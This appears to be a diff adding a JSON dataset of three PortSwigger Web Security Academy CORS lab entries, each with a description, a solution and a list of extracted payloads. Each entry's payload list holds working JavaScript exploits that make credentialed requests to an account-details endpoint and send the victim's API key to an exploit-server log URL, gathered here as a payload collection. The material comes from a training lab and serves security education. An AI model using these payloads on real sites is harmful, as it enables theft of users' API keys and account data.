@@ -1,0 +1,74 @@
+[
+  {
+    "url": "https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack",
+    "category": "cors",
+    "title": "CORS vulnerability with basic origin reflection",
+    "description": "This website has an insecure CORS configuration in that it trusts all origins.",
+    "solution_steps": [
+      "Check intercept is off, then use the browser to log in and access your account page.",
+      "Review the history and observe that your key is retrieved via an AJAX request to /accountDetails , and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.",
+      "Send the request to Burp Repeater, and resubmit it with the added header: Origin: https://example.com",
+      "Observe that the origin is reflected in the Access-Control-Allow-Origin header.",
+      "In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL: <script>\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);\n    req.withCredentials = true;\n    req.send();\n\n    function reqListener() {\n        location='/log?key='+this.responseText;\n    };\n</script>",
+      "Click View exploit . Observe that the exploit works - you have landed on the log page and your API key is in the URL.",
+      "Go back to the exploit server and click Deliver exploit to victim .",
+      "Click Access log , retrieve and submit the victim's API key to complete the lab."
+    ],
+    "solution": "1. Check intercept is off, then use the browser to log in and access your account page.\n2. Review the history and observe that your key is retrieved via an AJAX request to /accountDetails , and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.\n3. Send the request to Burp Repeater, and resubmit it with the added header: Origin: https://example.com\n4. Observe that the origin is reflected in the Access-Control-Allow-Origin header.\n5. In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL: <script>\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);\n    req.withCredentials = true;\n    req.send();\n\n    function reqListener() {\n        location='/log?key='+this.responseText;\n    };\n</script>\n6. Click View exploit . Observe that the exploit works - you have landed on the log page and your API key is in the URL.\n7. Go back to the exploit server and click Deliver exploit to victim .\n8. Click Access log , retrieve and submit the victim's API key to complete the lab.",
+    "payloads": [
+      "wiener:peter",
+      "/accountDetails",
+      "Access-Control-Allow-Credentials",
+      "Origin: https://example.com",
+      "Access-Control-Allow-Origin",
+      "YOUR-LAB-ID",
+      "<script>\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);\n    req.withCredentials = true;\n    req.send();\n\n    function reqListener() {\n        location='/log?key='+this.responseText;\n    };\n</script>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/cors/lab-breaking-https-attack",
+    "category": "cors",
+    "title": "CORS vulnerability with trusted insecure protocols",
+    "description": "This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.",
+    "solution": "If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim, so you'll need to find an alternative way of injecting JavaScript into the subdomain.",
+    "payloads": [
+      "wiener:peter",
+      "/accountDetails",
+      "Access-Control-Allow-Credentials",
+      "Origin: http://subdomain.lab-id",
+      "lab-id",
+      "Access-Control-Allow-Origin",
+      "productID",
+      "YOUR-LAB-ID",
+      "YOUR-EXPLOIT-SERVER-ID",
+      "<script>\n    document.location=\"http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1\"\n</script>"
+    ]
+  },
+  {
+    "url": "https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack",
+    "category": "cors",
+    "title": "CORS vulnerability with trusted null origin",
+    "description": "This website has an insecure CORS configuration in that it trusts the \"null\" origin.",
+    "solution_steps": [
+      "Check intercept is off, then use Burp's browser to log in to your account. Click \"My account\".",
+      "Review the history and observe that your key is retrieved via an AJAX request to /accountDetails , and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.",
+      "Send the request to Burp Repeater, and resubmit it with the added header Origin: null.",
+      "Observe that the \"null\" origin is reflected in the Access-Control-Allow-Origin header.",
+      "In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with the URL for your unique lab URL and YOUR-EXPLOIT-SERVER-ID with the exploit server ID: <iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);\n    req.withCredentials = true;\n    req.send();\n    function reqListener() {\n        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);\n    };\n</script>\"></iframe> Notice the use of an iframe sandbox as this generates a null origin request.",
+      "Click \"View exploit\". Observe that the exploit works - you have landed on the log page and your API key is in the URL.",
+      "Go back to the exploit server and click \"Deliver exploit to victim\".",
+      "Click \"Access log\", retrieve and submit the victim's API key to complete the lab."
+    ],
+    "solution": "1. Check intercept is off, then use Burp's browser to log in to your account. Click \"My account\".\n2. Review the history and observe that your key is retrieved via an AJAX request to /accountDetails , and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.\n3. Send the request to Burp Repeater, and resubmit it with the added header Origin: null.\n4. Observe that the \"null\" origin is reflected in the Access-Control-Allow-Origin header.\n5. In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with the URL for your unique lab URL and YOUR-EXPLOIT-SERVER-ID with the exploit server ID: <iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);\n    req.withCredentials = true;\n    req.send();\n    function reqListener() {\n        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);\n    };\n</script>\"></iframe> Notice the use of an iframe sandbox as this generates a null origin request.\n6. Click \"View exploit\". Observe that the exploit works - you have landed on the log page and your API key is in the URL.\n7. Go back to the exploit server and click \"Deliver exploit to victim\".\n8. Click \"Access log\", retrieve and submit the victim's API key to complete the lab.",
+    "payloads": [
+      "wiener:peter",
+      "/accountDetails",
+      "Access-Control-Allow-Credentials",
+      "Origin: null.",
+      "Access-Control-Allow-Origin",
+      "YOUR-LAB-ID",
+      "YOUR-EXPLOIT-SERVER-ID",
+      "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>\n    var req = new XMLHttpRequest();\n    req.onload = reqListener;\n    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);\n    req.withCredentials = true;\n    req.send();\n    function reqListener() {\n        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);\n    };\n</script>\"></iframe>"
+    ]
+  }
+]
